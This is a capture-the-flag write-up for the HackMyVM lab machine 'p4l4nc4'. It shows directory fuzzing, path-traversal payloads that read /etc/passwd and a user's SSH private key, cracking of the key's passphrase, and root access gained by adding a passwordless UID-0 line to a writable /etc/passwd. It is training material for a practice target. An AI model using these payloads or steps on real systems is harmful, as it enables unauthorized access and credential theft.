@@ -1,0 +1,299 @@
+---
+title: p4l4nc4
+date: '2025-05-24'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - '1337'
+  - CTF
+  - Easy
+  - LINUX
+cover: /mc/uploads/2025/05/images.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hi today we gonna try to hack the machine [**p4l4nc4** ](https://hackmyvm.eu/machines/machine.php?vm=p4l4nc4)from [**HackmyVM** ](https://hackmyvm.eu)the first view we can see that the title of the machine is encoded to 1337 or leet , so maybe we gonna encrypt/decrypt something
+
+As part of our initial reconnaissance phase, we will use **Nmap** to enumerate open ports on the target system.
+
+## Recon Nmap
+
+```bash
+nmap -sV -sC 192.168.1.186 -p-                                                                                                       
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 14:02 EDT
+Nmap scan report for 192.168.1.186
+Host is up (0.00064s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 21:a5:80:4d:e9:b6:f0:db:71:4d:30:a0:69:3a:c5:0e (ECDSA)
+|_  256 40:90:68:70:66:eb:f2:6c:f4:ca:f5:be:36:82:d0:72 (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+MAC Address: 08:00:27:A7:F0:5F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds
+```
+Ports **22 (SSH)** and **80 (HTTP)** are open. Let's begin by inspecting the web service running on port 80
+
+## FuZZ Directory:
+
+Let's perform directory fuzzing on the web server to uncover hidden files or directories that may contain useful information.
+
+```bash
+gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://192.168.1.186                               
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.186
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 10701]
+/robots.txt           (Status: 200) [Size: 1432]
+/server-status        (Status: 403) [Size: 278]
+Progress: 4744 / 4745 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+So, we found the **robots.txt** file let's check what it contains.
+
+```bash
+curl  http://192.168.1.186/robots.txt       
+-------------------------------------                                                                                         
+A palanca-negra-gigante Ã© uma subespÃ©cie de palanca-negra. De todas as subespÃ©cies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃ©cie Ã© endÃ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, apÃ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃªncia de mÃºltiplas espÃ©cies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃ§Ã£o CientÃ­fica da Universidade CatÃ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃªncias fotogrÃ¡ficas do Ãºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃªncia da populaÃ§Ã£o apÃ³s um duro perÃ­odo de guerra.
+Atualmente, a Palanca Negra Gigante Ã© considerada como o sÃ­mbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleÃ§Ã£o de futebol angolana Ã© denominada de palancas-negras e a companhia aÃ©rea angolana, TAAG, tem este antÃ­lope como sÃ­mbolo. Palanca Ã© tambÃ©m o nome de uma das subdivisÃµes da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antÃ­lopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual
+```
+After using Google Translate, I noticed the text is in Brazilian Portuguese .But that’s not the important part. If we look at the words in the text, we can spot the word 'palanca', which is also the title of the machine. This suggests it might be relevant. So, we can create a custom wordlist using **CeWL** and then encode it into 1337 (leet speak) to see if it helps with cracking or guessing credentials.
+
+```bash
+ζ cewl http://192.168.1.186/robots.txt -w wordlist
+```
+## 1337 script 
+
+```text
+so we gonna now create the 1337 list 
+```
+
+```bash
+ζ cat leet.sh                                                                                                                          
+input="$1"
+output="1337wordlist.txt"
+
+sed -e 's/a/4/g' -e 's/e/3/g' -e 's/i/1/g' -e 's/l/1/g' -e 's/o/0/g' -e 's/s/5/g' -e 's/t/7/g' "$input" > 1337.txt
+
+cat "$input" 1337.txt | tr '[:upper:]' '[:lower:]' > "$output" && rm 1337.txt
+```
+run the script :
+
+```bash
+ζ ./leet.sh wordlist
+```
+We're going to use the wordlist to try to brute-force the directory and hope for the best.
+
+```bash
+gobuster dir -w 1337wordlist.txt --url http://192.168.1.186/ -x php,txt,html                                                         
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.186/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                1337wordlist.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/n3gr4                (Status: 301) [Size: 314] [--> http://192.168.1.186/n3gr4/]
+Progress: 964 / 968 (99.59%)
+===============================================================
+Finished
+===============================================================
+
+```
+Let’s continue with further directory fuzzing
+
+```bash
+gobuster dir -w 1337wordlist.txt --url http://192.168.1.186/n3gr4 -x php,txt,html
+-----------------------------results---------------------------
+
+/m414nj3.php          (Status: 500) [Size: 0]
+```
+a PHP file, the next step is to analyze its query parameters for possible Local File Inclusion (LFI) or path traversal vulnerabilities. This can be done by injecting common traversal patterns and observing the server’s response.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:PARAM -u http://192.168.1.186/n3gr4/m414nj3.php\?PARAM\=1 -mc 200
+------------------------results-----------------------------------
+page                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
+```
+We’ve identified the **`page`** parameter and now we can test if it's vulnerable to path traversal. We could do this manually by injecting payloads like `../../etc/passwd`, but I’ll use a custom script I’m working on to automate and speed up the process.
+
+```bash
+python3 checker_path.py --url http://192.168.1.186/n3gr4/ -e m414nj3.php  -p page --file etc/passwd
+-------------------------------
+http://192.168.1.186/n3gr4/m414nj3.php?page=..%2F..%2F..%2F..%2Fetc/passwd
+```
+accessing one of the vulnerable URLs.
+
+```bash
+curl http://192.168.1.186/n3gr4/m414nj3.php\?page\=..%2F..%2F..%2F..%2Fetc/passwd                                                    
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+p4l4nc4:x:1000:1000:p4l4nc4,,,:/home/p4l4nc4:/bin/bash
+```
+we have found the user `p4l4nc4`. Let's see if we can read the flag or even retrieve an SSH private key.
+
+```bash
+curl http://192.168.1.186/n3gr4/m414nj3.php\?page\=../../../../home/p4l4nc4/user.txt                                                 
+HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
+```
+Good we've successfully retrieved the user flag.
+
+## Initial access 
+
+Now let's see if we can read the SSH private key
+
+```bash
+curl http://192.168.1.186/n3gr4/m414nj3.php\?page\=../../../../home/p4l4nc4/.ssh/id_rsa                                              
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
+2HLc7wYB9S1mbCAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMr
+n/f74/g82lqDkMHkyocXGXn8VaP/N7vD9j5mLSr1uhKGBbxcVm4uGP9k//mmRKlewRl/MZ
+nTg0N8MP9vp0O2B9vrwHLz9JekTblv93/VCDpJS78CGkNNOVMRcv2ZB3w7uFm6zxRZxQmH
+5HaRNuf795GQSFjybiqmN7Mu78bG/94aQMZZLALYmoyMCYWXGvvHpxRN1dwNsT7If4aNBE
+l1HXVrZY1biDOrpJQ7O+eZpD4IKs5/QgKL6w9nBczVcGKkvyms98A5qTa/F43+1CxQE2ng
+wPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gpAAADwI6Nr+vLoXaEJy
+SIRrVjIYFz/C3B17pmpx+lmupFfU6ruVHLE92gweyr9wAd5lxhKX1I6BClhlEoDWkzEBCT
+H/4zg2tj84+hzhdVWUy6KaCVbRbuvJYWQNWY4kgfk/3FTnSJFHd+k8CZImN3Xa/9DRVLmg
+jytzseFr83bPyOyG....................muaZDiXw==
+-----END OPENSSH PRIVATE KEY-----
+```
+ we have the SSH private key of **p4l4nc4**, we're going to extract the passphrase hash from it and try to crack it to find the password.
+
+```bash
+ssh2john id_rsa >Hash && john Hash -wordlist=/usr/share/wordlists/rockyou.txt
+---------------------results*------------------------------
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:10 0.00% (ETA: 2025-05-28 08:01) 0g/s 49.19p/s 49.19c/s 49.19C/s frankie..ganda
+friendster       (id_rsa)     
+1g 0:00:00:13 DONE (2025-05-24 14:47) 0.07633g/s 48.85p/s 48.85c/s 48.85C/s yankees..pebbles
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Password is **friendster**
+
+```bash
+ssh p4l4nc4@IP
+password: #friendster
+```
+## PrivEsc
+
+It looks like there’s no **`curl`** or **`wget`** available, so we’re going to use basic commands to check which files the user **p4l4nc4** has access to read or write.
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+```
+Unfortunately, nothing looks particularly interesting .
+
+```bash
+find / -writable -type f 2>/dev/null
+
+/proc/794/loginuid
+/proc/794/coredump_filter
+/proc/794/uid_map
+/proc/794/gid_map
+/proc/794/projid_map
+/proc/794/setgroups
+/proc/794/timerslack_ns
+/etc/passwd
+/home/p4l4nc4/user.txt
+/home/p4l4nc4/.bash_history
+/home/p4l4nc4/.profile
+/home/p4l4nc4/.ssh/id_rsa
+/home/p4l4nc4/.ssh/id_rsa.pub
+/home/p4l4nc4/.sudo_as_admin_successful
+/home/p4l4nc4/.bashrc
+/home/p4l4nc4/.bash_logout
+```
+NaaaaaaaaaaaNi! We can modify `/etc/passwd`, which means we can either remove the root password or add a new user with root privileges!
+
+```bash
+nutzh::0:0:nutzh:/root:/bin/bash
+```
+**or :**
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+     ↑
+   # Remove x
+root::0:0:root:/root:/bin/bash
+```
+And the last thing is to authenticate — either as `root` or as the new user you created
+
+```bash
+p4l4nc4@4ng014:~$ su nutzh
+root@4ng014:/home/p4l4nc4# cd ~
+root@4ng014:~# ls
+root.txt
+root@4ng014:~# cat root.txt 
+HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}
+
+```
+**Rooted**
